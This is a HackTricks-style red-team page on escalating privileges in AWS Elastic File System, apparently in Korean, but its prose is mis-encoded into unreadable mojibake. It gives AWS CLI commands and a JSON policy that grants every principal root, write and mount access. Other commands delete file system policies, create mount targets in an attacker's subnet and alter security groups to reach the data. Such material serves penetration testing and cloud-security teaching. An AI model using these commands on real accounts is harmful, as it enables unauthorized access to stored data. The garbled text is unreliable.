# AWS - EFS ê¶Œí•œ ìƒìŠ¹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## EFS

EFSì— ëŒ€í•œ **ì¶”ê°€ ì •ë³´**ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

EFSë¥¼ ë§ˆìš´íŠ¸í•˜ë ¤ë©´ EFSê°€ ë…¸ì¶œëœ í•˜ìœ„ ë„¤íŠ¸ì›Œí¬ì— ìˆì–´ì•¼í•˜ë©° ì•¡ì„¸ìŠ¤ ê¶Œí•œ(ë³´ì•ˆ ê·¸ë£¹)ì´ ìˆì–´ì•¼í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ ë˜ë©´ ê¸°ë³¸ì ìœ¼ë¡œ í•­ìƒ ë§ˆìš´íŠ¸ í•  ìˆ˜ ìˆì§€ë§Œ, IAM ì •ì±…ìœ¼ë¡œ ë³´í˜¸ë˜ëŠ” ê²½ìš° ì—¬ê¸°ì—ì„œ ì–¸ê¸‰ëœ ì¶”ê°€ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

ìœ„ ê¶Œí•œ ì¤‘ í•˜ë‚˜ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©´ ê³µê²©ìëŠ” **íŒŒì¼ ì‹œìŠ¤í…œ ì •ì±…ì„ ë³€ê²½**í•˜ì—¬ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ê±°ë‚˜ **ì‚­ì œ**í•˜ì—¬ **ê¸°ë³¸ ì•¡ì„¸ìŠ¤**ë¥¼ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì •ì±…ì„ ì‚­ì œí•˜ë ¤ë©´:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
ë³€ê²½í•˜ë ¤ë©´:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

ì´ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ” ê³µê²©ìëŠ” **EFSë¥¼ ë§ˆìš´íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. EFSë¥¼ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‚¬ìš©ìì—ê²Œ ê¸°ë³¸ì ìœ¼ë¡œ ì“°ê¸° ê¶Œí•œì´ ì£¼ì–´ì§€ì§€ ì•Šì€ ê²½ìš°, ê·¸ëŠ” **ì½ê¸° ê¶Œí•œ**ë§Œ ê°€ì§€ê²Œ ë  ê²ƒì…ë‹ˆë‹¤.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
ì¶”ê°€ ê¶Œí•œ `elasticfilesystem:ClientRootAccess`ì™€ `elasticfilesystem:ClientWrite`ëŠ” íŒŒì¼ ì‹œìŠ¤í…œì´ ë§ˆìš´íŠ¸ëœ í›„ì— í•´ë‹¹ íŒŒì¼ ì‹œìŠ¤í…œì— **ì“°ê¸°**í•˜ê³  **ë£¨íŠ¸ë¡œ ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì ì¬ì ì¸ ì˜í–¥:** íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

### `elasticfilesystem:CreateMountTarget`

EFSì˜ **ë§ˆìš´íŠ¸ íƒ€ê²Ÿì´ ì—†ëŠ” ì„œë¸Œë„·**ì— ê³µê²©ìê°€ ìœ„ì¹˜í•œ ê²½ìš°, ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ì—¬ **ìì‹ ì˜ ì„œë¸Œë„·ì— ë§ˆìš´íŠ¸ íƒ€ê²Ÿì„ ìƒì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**ì ì¬ì  ì˜í–¥:** íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

ê³µê²©ìê°€ EFSì— ìì‹ ì˜ ì„œë¸Œë„·ì— ë§ˆìš´íŠ¸ íƒ€ê²Ÿì´ ìˆì§€ë§Œ **íŠ¸ë˜í”½ì„ í—ˆìš©í•˜ëŠ” ë³´ì•ˆ ê·¸ë£¹ì´ ì—†ëŠ”** ìƒí™©ì—ì„œ, ê·¸ëŠ” ì„ íƒí•œ ë³´ì•ˆ ê·¸ë£¹ì„ ìˆ˜ì •í•˜ì—¬ **íŠ¸ë˜í”½ì„ í—ˆìš©í•˜ë„ë¡ ë³€ê²½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**ì ì¬ì  ì˜í–¥:** íŒŒì¼ ì‹œìŠ¤í…œì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì°¾ì•„ ê°„ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
